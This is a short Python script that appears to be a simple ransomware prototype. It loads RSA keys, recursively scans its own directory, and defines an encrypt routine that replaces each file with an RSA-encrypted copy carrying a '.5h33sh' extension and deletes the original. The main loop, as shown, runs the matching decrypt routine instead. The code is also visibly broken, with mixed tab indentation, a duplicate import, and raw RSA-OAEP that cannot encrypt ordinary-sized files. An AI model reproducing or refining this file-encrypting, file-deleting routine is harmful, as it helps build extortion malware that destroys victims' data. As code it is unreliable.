import os
import base64
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import binascii
with open('public.pem', 'rb') as f:
	pubKey = f.read()
#print(pubKey)
pubKey = RSA.import_key(pubKey)
with open('private.pem', 'rb') as f:
        privateKey = f.read()
        # create private key object
key = RSA.import_key(privateKey)
def encrypt(dataFile, publicKey):
    # read data from file
    extension = dataFile.suffix.lower()
    dataFile = str(dataFile)
    with open(dataFile, 'rb') as f:
        data = f.read()  
    # convert data to bytes
    data = bytes(data)
    encryptor = PKCS1_OAEP.new(publicKey)
    encrypted = encryptor.encrypt(data)
    fileName= dataFile.split(extension)[0]
    fileExtension = '.5h33sh'
    encryptedFile = fileName + fileExtension
    with open(encryptedFile, 'wb') as f:
    	f.write(encrypted)
    os.remove(dataFile)
def decrypt(dataFile, privateKey):
    with open(dataFile, 'rb') as f:
        ciphertext = f.read()
    decryptor = PKCS1_OAEP.new(privateKey)
    data = decryptor.decrypt(ciphertext)
    [ fileName, fileExtension ] = str(dataFile).split('.')
    decryptedFile = fileName + '_decrypted.' + fileExtension
    with open(decryptedFile, 'wb') as f:
        f.write(data)
	print('Decrypted file saved to ' + decryptedFile)
def scanRecurse(baseDir):
    '''
    Scan a directory and return a list of all files
    return: list of files
    '''
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry
        else:
            yield from scanRecurse(entry.path)
path = os.path.dirname(os.path.realpath(__file__))
excludeExtension = ['.py','.pem', '.exe'] # CHANGE THIS
for item in scanRecurse(path): 
	filePath = Path(item)
	fileType = filePath.suffix.lower()
	if fileType in excludeExtension:
	    continue
	decrypt(filePath,key)